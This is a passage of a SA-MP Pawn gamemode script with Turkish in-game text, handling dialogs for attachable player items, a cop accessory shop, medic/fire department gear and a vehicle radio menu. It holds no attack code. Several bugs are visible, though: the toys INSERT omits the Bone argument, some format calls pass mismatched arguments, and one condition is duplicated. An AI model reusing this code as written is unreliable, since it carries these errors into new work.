			    format(string, sizeof(string), "Oyuncaðýný baþarýlý bir þekilde çýkardýn. (Kemik: %s) (Slot: %d)", name, HoldingBones[PlayerToyInfo[playerid][listitem][ptBone]], listitem);
				SendClientMessage(playerid, COLOR_RED, string);
			    RemovePlayerAttachedObject(playerid, listitem);
			}
			else
			{
				if(listitem == 5 && PlayerInfo[playerid][pDonator] < 1) return SendClientMessage(playerid, COLOR_WHITE, "* Bu slotu kullanabilmek için Yakut VIP olman gerek.");
			 	if(listitem == 6 && PlayerInfo[playerid][pDonator] < 2) return SendClientMessage(playerid, COLOR_WHITE, "* Bu slotu kullanabilmek için Safir VIP olman gerek.");
        		if(listitem == 7 && PlayerInfo[playerid][pDonator] < 3) return SendClientMessage(playerid, COLOR_WHITE, "* Bu slotu kullanabilmek için Elmas VIP olman gerek.");

				if(PlayerToyInfo[playerid][listitem][ptScaleX] == 0) {
					PlayerToyInfo[playerid][listitem][ptScaleX] = 1.0;
					PlayerToyInfo[playerid][listitem][ptScaleY] = 1.0;
					PlayerToyInfo[playerid][listitem][ptScaleZ] = 1.0;
				}
			    SetPlayerAttachedObject(playerid, listitem, PlayerToyInfo[playerid][listitem][ptModelID], PlayerToyInfo[playerid][listitem][ptBone], PlayerToyInfo[playerid][listitem][ptPosX], PlayerToyInfo[playerid][listitem][ptPosY], PlayerToyInfo[playerid][listitem][ptPosZ],
				PlayerToyInfo[playerid][listitem][ptRotX], PlayerToyInfo[playerid][listitem][ptRotY], PlayerToyInfo[playerid][listitem][ptRotZ], PlayerToyInfo[playerid][listitem][ptScaleX], PlayerToyInfo[playerid][listitem][ptScaleY], PlayerToyInfo[playerid][listitem][ptScaleZ]);
			    new name[24];
			    format(name, sizeof(name), "Yok");

				for(new i;i<sizeof(HoldingObjectsAll);i++)
	   			{
					if(HoldingObjectsAll[i][holdingmodelid] == PlayerToyInfo[playerid][listitem][ptModelID])
					{
						format(name, sizeof(name), "%s", HoldingObjectsAll[i][holdingmodelname]);
					}
				}
				format(string, sizeof(string), "Oyuncaðýný baþarýlý bir þekilde taktýn. (Kemik: %s) (Slot: %d)", name, HoldingBones[PlayerToyInfo[playerid][listitem][ptBone]], listitem);
				SendClientMessage(playerid, COLOR_RED, string);
			}
		}
	}

	if((dialogid == DELETETOY) && response) {
		if(IsPlayerAttachedObjectSlotUsed(playerid, listitem)) {
		    RemovePlayerAttachedObject(playerid, listitem);
		}

	    new
	        szQuery[128];

		SetPVarInt(playerid, "deleteObject", listitem);
     	format(szQuery, sizeof(szQuery), "DELETE FROM toys WHERE Owner = %d AND ID = %d", PlayerInfo[playerid][pID], PlayerToyInfo[playerid][listitem][ptRealID]);
		mysql_query(szQuery, THREAD_DELETE_PLAYER_OBJECT, playerid, g_MySQLConnections[0]);
	}
	if((dialogid == BUYTOYSCOP) && response)
	{
	    new stringg[856];
		for(new x;x<MAX_PLAYERTOYS;x++)
		{
  			new name[24] = "Yok";

			for(new i;i<sizeof(HoldingObjectsAll);i++)
   			{
				if(HoldingObjectsAll[i][holdingmodelid] == PlayerToyInfo[playerid][x][ptModelID])
    			{
   					format(name, sizeof(name), "%s", HoldingObjectsAll[i][holdingmodelname]);
				}
			}

			format(stringg, sizeof(stringg), "%s(%d) %s ( %s)\n", stringg, x, name, HoldingBones[PlayerToyInfo[playerid][x][ptBone]]);
		}
		ShowPlayerDialogEx(playerid, BUYTOYSCOP2, DIALOG_STYLE_LIST, "Select a Slot", stringg, "Seç", "Iptal");
	}

	if((dialogid == BUYTOYSCOP2) && response)
	{
	    // (TEMPORARY - ZHAO NOTE) NO VIP added yet
	    /*if(listitem >= 3 && PlayerInfo[playerid][pDonator] < 1 || listitem >= 3 && PlayerInfo[playerid][pBuddyInvited] == 1) return SendClientMessage(playerid, COLOR_WHITE, "* You must be a Ruby Donator + to use that slot!");
	    if(listitem >= 4 && PlayerInfo[playerid][pDonator] < 2) return SendClientMessage(playerid, COLOR_WHITE, "* You must be a Sapphire Donator + to use that slot!");
        if(listitem >= 5 && PlayerInfo[playerid][pDonator] < 3) return SendClientMessage(playerid, COLOR_WHITE, "* You must be a Diamond Donator + to use that slot!");
	    if(PlayerToyInfo[playerid][listitem][ptModelID] != 0) return SendClientMessage(playerid, COLOR_YELLOW, "* O slotta baþka bir eþyan var. Silmek için /oyuncaklar yaz.");*/

		slotselection[playerid] = listitem;

		new stringg[1024];
		for(new x;x<sizeof(HoldingObjectsCop);x++)
		{
		    format(stringg, sizeof(stringg), "%s%s ($%d)\n", stringg, HoldingObjectsCop[x][holdingmodelname], HoldingObjectsCop[x][holdingprice]);
		}
		ShowPlayerDialogEx(playerid, BUYTOYSCOP3, DIALOG_STYLE_LIST, "* Ýtem Seç", stringg, "Satýn Al", "Iptal");
	}
	if((dialogid == BUYTOYSCOP3) && response)
	{
		if(GetPlayerCash(playerid) < HoldingObjectsCop[listitem][holdingprice])
		{
		    SendClientMessage(playerid, COLOR_WHITE, "* Bunu karþýlayamazsýn!");
		}
		else
		{
			GivePlayerCash(playerid, -HoldingObjectsCop[listitem][holdingprice]);
		    PlayerToyInfo[playerid][slotselection[playerid]][ptModelID] = HoldingObjectsCop[listitem][holdingmodelid];

   			new modelid = PlayerToyInfo[playerid][slotselection[playerid]][ptModelID];
		    if((modelid >= 19006 && modelid <= 19035) || (modelid >= 19138 && modelid <= 19140))
		    {
		        PlayerToyInfo[playerid][slotselection[playerid]][ptBone] = 2;
				PlayerToyInfo[playerid][slotselection[playerid]][ptPosX] = 0.9;
				PlayerToyInfo[playerid][slotselection[playerid]][ptPosY] = 0.0;
				PlayerToyInfo[playerid][slotselection[playerid]][ptPosZ] = 0.35;
				PlayerToyInfo[playerid][slotselection[playerid]][ptRotX] = 90.0;
				PlayerToyInfo[playerid][slotselection[playerid]][ptRotY] = 90.0;
				PlayerToyInfo[playerid][slotselection[playerid]][ptRotZ] = 0.0;
		    }
		    else if(modelid >= 18891 && modelid <= 18910)
		    {
		    	PlayerToyInfo[playerid][slotselection[playerid]][ptBone] = 2;
				PlayerToyInfo[playerid][slotselection[playerid]][ptPosX] = 0.15;
				PlayerToyInfo[playerid][slotselection[playerid]][ptPosY] = 0.0;
				PlayerToyInfo[playerid][slotselection[playerid]][ptPosZ] = 0.0;
				PlayerToyInfo[playerid][slotselection[playerid]][ptRotX] = 90.0;
				PlayerToyInfo[playerid][slotselection[playerid]][ptRotY] = 180.0;
				PlayerToyInfo[playerid][slotselection[playerid]][ptRotZ] = 90.0;
			}
			else if(modelid >= 18926 && modelid <= 18935)
			{
				PlayerToyInfo[playerid][slotselection[playerid]][ptBone] = 2;
				PlayerToyInfo[playerid][slotselection[playerid]][ptPosX] = 0.1;
				PlayerToyInfo[playerid][slotselection[playerid]][ptPosY] = 0.0;
				PlayerToyInfo[playerid][slotselection[playerid]][ptPosZ] = 0.0;
				PlayerToyInfo[playerid][slotselection[playerid]][ptRotX] = 0.0;
				PlayerToyInfo[playerid][slotselection[playerid]][ptRotY] = 0.0;
				PlayerToyInfo[playerid][slotselection[playerid]][ptRotZ] = 0.0;
			}
			else if(modelid >= 18911 && modelid <= 18920)
			{
			    PlayerToyInfo[playerid][slotselection[playerid]][ptBone] = 2;
				PlayerToyInfo[playerid][slotselection[playerid]][ptPosX] = 0.1;
				PlayerToyInfo[playerid][slotselection[playerid]][ptPosY] = 0.035;
				PlayerToyInfo[playerid][slotselection[playerid]][ptPosZ] = 0.0;
				PlayerToyInfo[playerid][slotselection[playerid]][ptRotX] = 90.0;
				PlayerToyInfo[playerid][slotselection[playerid]][ptRotY] = 180.0;
				PlayerToyInfo[playerid][slotselection[playerid]][ptRotZ] = 90.0;
			}
			else if(modelid == 19078 || modelid == 19078)
			{
			    PlayerToyInfo[playerid][slotselection[playerid]][ptBone] = 16;
				PlayerToyInfo[playerid][slotselection[playerid]][ptPosX] = 0;
				PlayerToyInfo[playerid][slotselection[playerid]][ptPosY] = 0;
				PlayerToyInfo[playerid][slotselection[playerid]][ptPosZ] = 0;
				PlayerToyInfo[playerid][slotselection[playerid]][ptRotX] = 180.0;
				PlayerToyInfo[playerid][slotselection[playerid]][ptRotY] = 180.0;
				PlayerToyInfo[playerid][slotselection[playerid]][ptRotZ] = 0.0;
			}
			else if((modelid >= 18641 && modelid <= 18644) || (modelid >= 19080 && modelid <= 19084) || modelid == 18890)
			{
			    PlayerToyInfo[playerid][slotselection[playerid]][ptBone] = 6;
				PlayerToyInfo[playerid][slotselection[playerid]][ptPosX] = 0.0;
				PlayerToyInfo[playerid][slotselection[playerid]][ptPosY] = 0.0;
				PlayerToyInfo[playerid][slotselection[playerid]][ptPosZ] = 0.0;
				PlayerToyInfo[playerid][slotselection[playerid]][ptRotX] = 0.0;
				PlayerToyInfo[playerid][slotselection[playerid]][ptRotY] = 0.0;
				PlayerToyInfo[playerid][slotselection[playerid]][ptRotZ] = 0.0;
			}
		    else
		    {
				PlayerToyInfo[playerid][slotselection[playerid]][ptBone] = 2;
				PlayerToyInfo[playerid][slotselection[playerid]][ptPosX] = 0.0;
				PlayerToyInfo[playerid][slotselection[playerid]][ptPosY] = 0.0;
				PlayerToyInfo[playerid][slotselection[playerid]][ptPosZ] = 0.0;
				PlayerToyInfo[playerid][slotselection[playerid]][ptRotX] = 0.0;
				PlayerToyInfo[playerid][slotselection[playerid]][ptRotY] = 0.0;
				PlayerToyInfo[playerid][slotselection[playerid]][ptRotZ] = 0.0;
			}
			PlayerToyInfo[playerid][slotselection[playerid]][ptScaleX] = 1.0;
			PlayerToyInfo[playerid][slotselection[playerid]][ptScaleY] = 1.0;
			PlayerToyInfo[playerid][slotselection[playerid]][ptScaleZ] = 1.0;

			new
			    szQuery[460];
			format(szQuery, sizeof(szQuery),"INSERT INTO toys (Owner, ModelID, Bone, PosX, PosY, PosZ, RotX, RotY, RotZ, ScaX, ScaY, ScaZ) VALUES(%d, %d, %d, '%f', '%f', '%f', '%f', '%f', '%f', '%f', '%f', '%f')",
			PlayerInfo[playerid][pID], PlayerToyInfo[playerid][slotselection[playerid]][ptModelID], PlayerToyInfo[playerid][slotselection[playerid]][ptPosX], PlayerToyInfo[playerid][slotselection[playerid]][ptPosY], PlayerToyInfo[playerid][slotselection[playerid]][ptPosZ],
			PlayerToyInfo[playerid][slotselection[playerid]][ptRotX], PlayerToyInfo[playerid][slotselection[playerid]][ptRotY], PlayerToyInfo[playerid][slotselection[playerid]][ptRotZ], PlayerToyInfo[playerid][slotselection[playerid]][ptScaleX], PlayerToyInfo[playerid][slotselection[playerid]][ptScaleY],
			PlayerToyInfo[playerid][slotselection[playerid]][ptScaleZ]);
			mysql_query(szQuery);
			PlayerToyInfo[playerid][slotselection[playerid]][ptRealID] = mysql_insert_id();

			format(string, sizeof(string), "* $%d ödeyerek %s satýn aldýn (Slot: %d)", HoldingObjectsCop[listitem][holdingmodelname], HoldingObjectsCop[listitem][holdingprice], slotselection[playerid]);
		    SendClientMessage(playerid, COLOR_RED, string);
		    SendClientMessage(playerid, COLOR_WHITE,"IPUCU: Oyuncaðýný giymek/ayarlamak için /oyuncaklar yaz.");
		}
	}
	if(dialogid == LSFMDMENU)
	{
		if(response)
		{
			if(listitem == 0)
			{
				if(PlayerInfo[playerid][pDuty] == 0)
				{
					GetPlayerName(playerid, sendername, sizeof(sendername));
					format(string, sizeof(string), "* Doktor %s, ekipmanlarýný aldý ve iþbaþý yaptý.", GetPlayerNameEx(playerid));
					ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					SetPlayerColor(playerid,TEAM_MED_COLOR);
					SetPlayerArmourEx(playerid, 100);
					SetPlayerHealth(playerid, 100.0);
					if(PlayerInfo[playerid][pRank] >= 4 || PlayerInfo[playerid][pLeader] == 3)
					{
        				GivePlayerValidWeapon(playerid, 42, 99999);
        			}
					Medics += 1;
					PlayerInfo[playerid][pDuty] = 1;
				}
				else
				{
					format(string, sizeof(string), "* Doktor %s, ekipmanlarýný yerine koydu ve iþbaþýndan çýktý.", GetPlayerNameEx(playerid));
					ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					Medics -= 1;
					PlayerInfo[playerid][pDuty] = 0;
					SetPlayerColor(playerid,TEAM_HIT_COLOR);
				}
			}
			if(listitem == 1)
			{
    			ShowPlayerDialogEx(playerid, LSFMDSKINS, DIALOG_STYLE_LIST, "Hangi üniformayý giymek istiyorsun?","Yangýn Kýyafeti 1\nYangýn Kýyafeti 2\nYangýn Kýyafeti 3\nDoktor 1\nDoktor 2\nDoktor3\nBayan\nYüksek Rütbe", "Seç", "Iptal");
			}
			if(listitem == 2)
			{
                ShowPlayerDialogEx(playerid, LSFMDGEAR, DIALOG_STYLE_LIST, "Hangi ekipmaný istiyorsun?","Sprey\nKürek\nKamera\nParaþüt\nYangýn Söndürücü\nTestere\nShotgun\nZýrh\nÝlk Yardim Kiti\nAksesuarlar", "Seç", "Iptal");
			}
			if(listitem == 3)
			{
				SetPlayerColor(playerid, TEAM_MED_COLOR);
				SetPlayerSkin(playerid, 170);
				ResetPlayerWeaponsEx(playerid);
			}
		}
 	}
    if(dialogid == LSFMDSKINS)
	{
		if(response)
		{
			if(listitem == 0)
			{
			    PlayerInfo[playerid][pSkin] = 277;
				SetPlayerSkin(playerid, 277);
			}
			if(listitem == 1)
			{
			    PlayerInfo[playerid][pSkin] = 278;
    			SetPlayerSkin(playerid, 278);
			}
			if(listitem == 2)
			{
			    PlayerInfo[playerid][pSkin] = 279;
                SetPlayerSkin(playerid, 279);
			}
			if(listitem == 3)
			{
			    PlayerInfo[playerid][pSkin] = 274;
				SetPlayerSkin(playerid, 274);
			}
			if(listitem == 4)
			{
			    PlayerInfo[playerid][pSkin] = 275;
				SetPlayerSkin(playerid, 275);
			}
			if(listitem == 5)
			{
			    PlayerInfo[playerid][pSkin] = 276;
				SetPlayerSkin(playerid, 276);
			}
			if(listitem == 6)
			{
			    PlayerInfo[playerid][pSkin] = 217;
				SetPlayerSkin(playerid, 211);
			}
			if(listitem == 7)
			{
			    if(PlayerInfo[playerid][pRank] >= 5)
			    {
			        PlayerInfo[playerid][pSkin] = 295;
					SetPlayerSkin(playerid, 295);
				}
				else
				{
				    SendClientMessage(playerid, COLOR_GRAD2, "Bu üniformayý yalnýzca R5 ve R6'lar giyebilir.");
				}
			}
		}
 	}
  	if(dialogid == LSFMDGEAR)
	{
		if(response)
		{
		    if(PlayerInfo[playerid][pConnectTime] < 2)
				return SendClientMessage(playerid, COLOR_GRAD2, "Silah taþýman yasaklandýðýndan dolayý bunu kullanamazsýn!");

			switch(listitem) {
			    case 0: GivePlayerValidWeapon(playerid, 41, 99999);
			    case 1: GivePlayerValidWeapon(playerid, 6, 99999);
			    case 2: GivePlayerValidWeapon(playerid, 43, 99999);
			    case 3: GivePlayerValidWeapon(playerid, 46, 99999);
			    case 4: GivePlayerValidWeapon(playerid, 42, 99999);
			    case 5: {
	                if(PlayerInfo[playerid][pRank] >= 4 || PlayerInfo[playerid][pLeader] == 4) {
	        			GivePlayerValidWeapon(playerid, 9, 99999);
	        		} else SendClientMessage(playerid, COLOR_GRAD2, "You're not a high enough rank!");
				}
				case 6: GivePlayerValidWeapon(playerid, 25, 99999);
				case 7: SetPlayerArmourEx(playerid, 100);
				case 8: SetPlayerHealth(playerid, 100);
				case 9: ShowPlayerDialogEx(playerid, BUYTOYSCOP, DIALOG_STYLE_MSGBOX, "Aksesuarlar", "Devlet memurlarýnýn aksesuar dolabýna hoþgeldiniz.","Devam", "Iptal");
			}

			/*if(listitem == 0)
			{
				GivePlayerValidWeapon(playerid, 6, 99999);
			}
			else if(listitem == 1)
			{
				GivePlayerValidWeapon(playerid, 43, 99999);
			}
			else if(listitem == 2)
			{
				GivePlayerValidWeapon(playerid, 46, 99999);
			}
			else if(listitem == 3)
			{
				GivePlayerValidWeapon(playerid, 42, 99999);
			}
			else if(listitem == 4)
			{
                if(PlayerInfo[playerid][pRank] >= 4 || PlayerInfo[playerid][pLeader] == 4)
                {
        			GivePlayerValidWeapon(playerid, 9, 99999);
        		}
        		else
        		{
            		SendClientMessage(playerid, COLOR_GRAD2, "You're not a high enough rank!");
        		}
			}
			else if(listitem == 5)
			{
        		GivePlayerValidWeapon(playerid, 25, 99999);
			}
			else if(listitem == 6)
			{
        		SetPlayerArmourEx(playerid, 100);
			}
			else if(listitem == 7) SetPlayerHealth(playerid, 100);*/
			//else if(listitem == 8) ShowPlayerDialogEx(playerid, BUYTOYSCOP, DIALOG_STYLE_MSGBOX, "Aksesuarlar", "Devlet memurlarýnýn aksesuar dolabýna hoþgeldiniz.","Devam", "Iptal");
		}
 	}
	if(dialogid == DIALOG_RADIOMENU_START)
	{
		if(response)
		{
			if(listitem == 0)
			{
  				new radiovehicle = GetPlayerVehicleID(playerid);

  				if(VehicleRadioStation[radiovehicle] == 0)
  				{
  				    SendClientMessage(playerid, COLOR_GRAD1, "Bu araçtaki radyo zaten kapalý.");
					return 1;
  				}

				format(string, sizeof(string), "* %s radyosunu kapattý.", GetPlayerNameEx(playerid));
				ProxDetector(25.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);

			    VehicleRadioStation[radiovehicle] = 0;
       			StopAudioStreamForPlayer(playerid);

          		foreach(Player, i)
				{
				    if(GetPlayerVehicleID(i) == radiovehicle && IsPlayerInAnyVehicle(i) && GetPlayerState(i) == PLAYER_STATE_PASSENGER && i != playerid)
				    {
				        StopAudioStreamForPlayer(i);
				    }
				}
			}
			if(listitem == 1)
			{
				ShowPlayerDialogEx(playerid, DIALOG_RADIOMENU_SEARCH, DIALOG_STYLE_INPUT, "Radyo istasyonlarý - Radyo Ara", "Aramak istediðin radyo istasyonunu gir.\n\nUyarý: Aramak için minimum 3 karakter girmelisin.", "Ara", "Iptal");
			}
			if(listitem == 2)
			{
				ShowPlayerDialogEx(playerid, DIALOG_RADIOMENU_GENRE, DIALOG_STYLE_LIST, "Radyo istasyonlarý - Select a genre", "Alternatif\nHüzün\nKlasik\nÞehir\nYýl\nDinlemesi Kolay\nElektronik\nHalk\nÝlhamverici\nEvrensel\nJazz\nLatin\nMetal\nMisc\nYeni Yýl\nPop\nHerkese Açýk Radyo\nR&B/Urban\nRap\nReggae\nRock\nSohbet", "Seç", "Iptal");
			}
		}
	}
	if(dialogid == DIALOG_RADIOMENU_SEARCH)
	{
		if(response)
		{
 			if(strlen(inputtext) < 3)
	    	{
	        	ShowPlayerDialogEx(playerid, DIALOG_RADIOMENU_SEARCH, DIALOG_STYLE_INPUT, "Radyo istasyonlarý - Radyo Ara", "ÝÇERÝK REDDEDÝLDÝ: Arama yapmak için minimum 3 karakter girmelisin.\n\nAramak istediðin radyo istasyonunu gir.\n\nUyarý: Minimum 3 karakter olmalý.", "Ara", "Iptal");
	    	}
	    	else
	    	{
	    	    for(new x; x < 50; ++x) ListItemTrackId[playerid][x] = -1;

    			new stringg[512], name[32], search[128], iCount;

    			strcat(search, inputtext, sizeof(search));

				for (new i=0; i<220; i++)
				{
					if(strfind(VehicleRadioListing[i][radioname], search, true) != -1 && iCount < 50)
					{
            			format(name, sizeof(name), "%s", VehicleRadioListing[i][radioname]);
						format(stringg, sizeof(stringg), "%s %s\n", stringg, name);
						ListItemTrackId[playerid][iCount++] = i;
					}
				}
				if(iCount == 0)
				{
				    ShowPlayerDialogEx(playerid, DIALOG_RADIOMENU_SEARCH, DIALOG_STYLE_INPUT, "Radyo istasyonlarý - Radyo Ara", "ARAMA BAÞARISIZ: Aranan radyo istasyonu bulunamadý.\n\nAramak istediðin istasyonu gir.\n\nUyarý: 3 karakterden az olmamalý.", "Ara", "Iptal");
				}
				else
				{
					ShowPlayerDialogEx(playerid, DIALOG_RADIOMENU_SEARCHLIST, DIALOG_STYLE_LIST, "Radio Ýstasyonu - Arama Sonuçlarý", stringg, "Oynat", "Iptal");
				}
			}
	    }
 	}
	if(dialogid == DIALOG_RADIOMENU_SEARCHLIST)
	{
		if(response)
		{
			new t = ListItemTrackId[playerid][listitem];
			new radiovehicle = GetPlayerVehicleID(playerid);

			if(VehicleRadioStation[radiovehicle] == t+1)
			{
   				SendClientMessage(playerid, COLOR_GRAD1, "Bu araçtaki radyo istasyonu zaten o.");
				return 1;
			}

			format(string, sizeof(string), "* %s radyo istasyonunu %s olarak deðiþtirdi.", GetPlayerNameEx(playerid), VehicleRadioListing[t][radioname]);
			ProxDetector(25.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			VehicleRadioStation[radiovehicle] = t+1;
  			PlayAudioStreamForPlayer(playerid, VehicleRadioListing[t][radiourl]);

			foreach(Player, i)
			{
  				if(GetPlayerVehicleID(i) == radiovehicle && IsPlayerInAnyVehicle(i) && GetPlayerState(i) == PLAYER_STATE_PASSENGER && i != playerid)
	    		{
      				PlayAudioStreamForPlayer(i, VehicleRadioListing[t][radiourl]);
		    	}
			}
		}
	}
	if(dialogid == DIALOG_RADIOMENU_GENRE)
	{
		if(response)
		{
			new stringg[321], name[32], iCount;

			for(new x; x < 50; ++x) ListItemTrackId[playerid][x] = -1;

			if(listitem == 0)
			{
			    for(new r = 0; r < 10; ++r)
			    {
    				format(name, sizeof(name), "%s", VehicleRadioListing[r][radioname]);
					format(stringg, sizeof(stringg), "%s %s\n", stringg, name);
					ListItemTrackId[playerid][iCount++] = r;
			    }
                ShowPlayerDialogEx(playerid, DIALOG_RADIOMENU_PLAY, DIALOG_STYLE_LIST, "Radyo istasyonlarý - Alternatif", stringg, "Oynat", "Iptal");
			}
			if(listitem == 1)
			{
   				for(new r = 10; r < 20; ++r)
			    {
    				format(name, sizeof(name), "%s", VehicleRadioListing[r][radioname]);
					format(stringg, sizeof(stringg), "%s %s\n", stringg, name);
					ListItemTrackId[playerid][iCount++] = r;
			    }
                ShowPlayerDialogEx(playerid, DIALOG_RADIOMENU_PLAY, DIALOG_STYLE_LIST, "Radyo istasyonlarý - Hüzün", stringg, "Oynat", "Iptal");
			}
			if(listitem == 2)
			{
   				for(new r = 20; r < 30; ++r)
			    {
    				format(name, sizeof(name), "%s", VehicleRadioListing[r][radioname]);
					format(stringg, sizeof(stringg), "%s %s\n", stringg, name);
					ListItemTrackId[playerid][iCount++] = r;
			    }
                ShowPlayerDialogEx(playerid, DIALOG_RADIOMENU_PLAY, DIALOG_STYLE_LIST, "Radyo istasyonlarý - Klasik", stringg, "Oynat", "Iptal");
			}
			if(listitem == 3)
			{
   				for(new r = 30; r < 40; ++r)
			    {
    				format(name, sizeof(name), "%s", VehicleRadioListing[r][radioname]);
					format(stringg, sizeof(stringg), "%s %s\n", stringg, name);
					ListItemTrackId[playerid][iCount++] = r;
			    }
                ShowPlayerDialogEx(playerid, DIALOG_RADIOMENU_PLAY, DIALOG_STYLE_LIST, "Radyo istasyonlarý - Þehir", stringg, "Oynat", "Iptal");
			}
			if(listitem == 4)
			{
   				for(new r = 40; r < 50; ++r)
			    {
    				format(name, sizeof(name), "%s", VehicleRadioListing[r][radioname]);
					format(stringg, sizeof(stringg), "%s %s\n", stringg, name);
					ListItemTrackId[playerid][iCount++] = r;
			    }
                ShowPlayerDialogEx(playerid, DIALOG_RADIOMENU_PLAY, DIALOG_STYLE_LIST, "Radyo istasyonlarý - Yýllar", stringg, "Oynat", "Iptal");
			}
			if(listitem == 5)
			{
   				for(new r = 50; r < 60; ++r)
			    {
    				format(name, sizeof(name), "%s", VehicleRadioListing[r][radioname]);
					format(stringg, sizeof(stringg), "%s %s\n", stringg, name);
					ListItemTrackId[playerid][iCount++] = r;
			    }
                ShowPlayerDialogEx(playerid, DIALOG_RADIOMENU_PLAY, DIALOG_STYLE_LIST, "Radyo istasyonlarý - Dinlemesi Kolay", stringg, "Oynat", "Iptal");
			}
			if(listitem == 6)
			{
   				for(new r = 60; r < 70; ++r)
			    {
    				format(name, sizeof(name), "%s", VehicleRadioListing[r][radioname]);
					format(stringg, sizeof(stringg), "%s %s\n", stringg, name);
					ListItemTrackId[playerid][iCount++] = r;
			    }
                ShowPlayerDialogEx(playerid, DIALOG_RADIOMENU_PLAY, DIALOG_STYLE_LIST, "Radyo istasyonlarý - Elektronik", stringg, "Oynat", "Iptal");
			}
			if(listitem == 7)
			{
   				for(new r = 70; r < 80; ++r)
			    {
    				format(name, sizeof(name), "%s", VehicleRadioListing[r][radioname]);
					format(stringg, sizeof(stringg), "%s %s\n", stringg, name);
					ListItemTrackId[playerid][iCount++] = r;
			    }
                ShowPlayerDialogEx(playerid, DIALOG_RADIOMENU_PLAY, DIALOG_STYLE_LIST, "Radyo istasyonlarý - Halk", stringg, "Oynat", "Iptal");
			}
			if(listitem == 8)
			{
   				for(new r = 80; r < 90; ++r)
			    {
    				format(name, sizeof(name), "%s", VehicleRadioListing[r][radioname]);
					format(stringg, sizeof(stringg), "%s %s\n", stringg, name);
					ListItemTrackId[playerid][iCount++] = r;
			    }
                ShowPlayerDialogEx(playerid, DIALOG_RADIOMENU_PLAY, DIALOG_STYLE_LIST, "Radyo istasyonlarý - Ýlhamverici", stringg, "Oynat", "Iptal");
			}
			if(listitem == 9)
			{
   				for(new r = 90; r < 100; ++r)
			    {
    				format(name, sizeof(name), "%s", VehicleRadioListing[r][radioname]);
					format(stringg, sizeof(stringg), "%s %s\n", stringg, name);
					ListItemTrackId[playerid][iCount++] = r;
			    }
                ShowPlayerDialogEx(playerid, DIALOG_RADIOMENU_PLAY, DIALOG_STYLE_LIST, "Radyo istasyonlarý - Evrensel", stringg, "Oynat", "Iptal");
			}
			if(listitem == 10)
			{
   				for(new r = 100; r < 110; ++r)
			    {
    				format(name, sizeof(name), "%s", VehicleRadioListing[r][radioname]);
					format(stringg, sizeof(stringg), "%s %s\n", stringg, name);
					ListItemTrackId[playerid][iCount++] = r;
			    }
                ShowPlayerDialogEx(playerid, DIALOG_RADIOMENU_PLAY, DIALOG_STYLE_LIST, "Radyo istasyonlarý - Jazz", stringg, "Oynat", "Iptal");
			}
			if(listitem == 11)
			{
				for(new r = 110; r < 120; ++r)
			    {
    				format(name, sizeof(name), "%s", VehicleRadioListing[r][radioname]);
					format(stringg, sizeof(stringg), "%s %s\n", stringg, name);
					ListItemTrackId[playerid][iCount++] = r;
			    }
                ShowPlayerDialogEx(playerid, DIALOG_RADIOMENU_PLAY, DIALOG_STYLE_LIST, "Radyo istasyonlarý - Latin", stringg, "Oynat", "Iptal");
			}
			if(listitem == 12)
			{
				for(new r = 120; r < 130; ++r)
			    {
    				format(name, sizeof(name), "%s", VehicleRadioListing[r][radioname]);
					format(stringg, sizeof(stringg), "%s %s\n", stringg, name);
					ListItemTrackId[playerid][iCount++] = r;
			    }
                ShowPlayerDialogEx(playerid, DIALOG_RADIOMENU_PLAY, DIALOG_STYLE_LIST, "Radyo istasyonlarý - Metal", stringg, "Oynat", "Iptal");
			}
			if(listitem == 13)
			{
				for(new r = 130; r < 140; ++r)
			    {
    				format(name, sizeof(name), "%s", VehicleRadioListing[r][radioname]);
					format(stringg, sizeof(stringg), "%s %s\n", stringg, name);
					ListItemTrackId[playerid][iCount++] = r;
			    }
                ShowPlayerDialogEx(playerid, DIALOG_RADIOMENU_PLAY, DIALOG_STYLE_LIST, "Radyo istasyonlarý - Misc", stringg, "Oynat", "Iptal");
			}
			if(listitem == 14)
			{
				for(new r = 140; r < 150; ++r)
			    {
    				format(name, sizeof(name), "%s", VehicleRadioListing[r][radioname]);
					format(stringg, sizeof(stringg), "%s %s\n", stringg, name);
					ListItemTrackId[playerid][iCount++] = r;
			    }
                ShowPlayerDialogEx(playerid, DIALOG_RADIOMENU_PLAY, DIALOG_STYLE_LIST, "Radyo istasyonlarý - Yeni Yýl", stringg, "Oynat", "Iptal");
			}
			if(listitem == 15)
			{
				for(new r = 150; r < 160; ++r)
			    {
    				format(name, sizeof(name), "%s", VehicleRadioListing[r][radioname]);
					format(stringg, sizeof(stringg), "%s %s\n", stringg, name);
					ListItemTrackId[playerid][iCount++] = r;
			    }
                ShowPlayerDialogEx(playerid, DIALOG_RADIOMENU_PLAY, DIALOG_STYLE_LIST, "Radyo istasyonlarý - Pop", stringg, "Oynat", "Iptal");
			}
			if(listitem == 16)
			{
				for(new r = 160; r < 170; ++r)
			    {
    				format(name, sizeof(name), "%s", VehicleRadioListing[r][radioname]);
					format(stringg, sizeof(stringg), "%s %s\n", stringg, name);
					ListItemTrackId[playerid][iCount++] = r;
			    }
                ShowPlayerDialogEx(playerid, DIALOG_RADIOMENU_PLAY, DIALOG_STYLE_LIST, "Radyo istasyonlarý - Herkese Açýk Radyo", stringg, "Oynat", "Iptal");
			}
			if(listitem == 17)
			{
				for(new r = 170; r < 180; ++r)
			    {
    				format(name, sizeof(name), "%s", VehicleRadioListing[r][radioname]);
					format(stringg, sizeof(stringg), "%s %s\n", stringg, name);
					ListItemTrackId[playerid][iCount++] = r;
			    }
                ShowPlayerDialogEx(playerid, DIALOG_RADIOMENU_PLAY, DIALOG_STYLE_LIST, "Radyo istasyonlarý - R&B/Urban", stringg, "Oynat", "Iptal");
			}
			if(listitem == 18)
			{
				for(new r = 180; r < 190; ++r)
			    {
    				format(name, sizeof(name), "%s", VehicleRadioListing[r][radioname]);
					format(stringg, sizeof(stringg), "%s %s\n", stringg, name);
					ListItemTrackId[playerid][iCount++] = r;
			    }
                ShowPlayerDialogEx(playerid, DIALOG_RADIOMENU_PLAY, DIALOG_STYLE_LIST, "Radyo istasyonlarý - Rap", stringg, "Oynat", "Iptal");
			}
			if(listitem == 19)
			{
				for(new r = 190; r < 200; ++r)
			    {
